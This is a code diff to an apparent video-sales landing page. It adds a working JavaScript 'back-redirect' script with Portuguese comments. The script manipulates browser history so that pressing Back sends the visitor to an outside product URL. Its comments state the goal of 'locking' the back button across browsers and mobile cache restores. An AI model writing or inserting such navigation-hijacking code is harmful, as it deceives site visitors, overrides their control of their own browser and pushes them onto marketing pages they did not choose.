@@ -15,7 +15,34 @@
         <meta name="description" content="Descrição">
         <title>Secret</title>
         
-        
+        <!-- Back-redirect: coloca antes de </body> -->
+<script>
+(function(){
+  var redirectUrl = 'https://best-picks.site/glycobottles';
+
+  // Empurra um estado para o histórico para "travar" o back
+  try { history.pushState(null, '', location.href); } catch(e){}
+
+  // Ao detectar popstate (usuário apertou back), substituir a localização
+  window.addEventListener('popstate', function () {
+    // Usa replace para não criar nova entrada no histórico
+    location.replace(redirectUrl);
+  }, {passive: true});
+
+  // Re-empurra o estado se a página for restaurada do cache (mobile Safari, etc.)
+  window.addEventListener('pageshow', function(e){
+    if (e.persisted) {
+      try { history.pushState(null, '', location.href); } catch(err){}
+    }
+  });
+
+  // Técnica adicional (hash) para maior compatibilidade em alguns navegadores/gestos
+  if (!location.hash.includes('#no-back')) {
+    location.hash = '#no-back';
+    setTimeout(function(){ try { history.pushState(null, '', location.href); } catch(e){} }, 50);
+  }
+})();
+</script>
         <script>!function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);</script>
 <link rel="preload" href="https://scripts.converteai.net/a40f7530-5f7f-48d7-b41c-e4110634f2e6/players/6908259d8764bca5bd1a04eb/v4/player.js" as="script">
 <link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
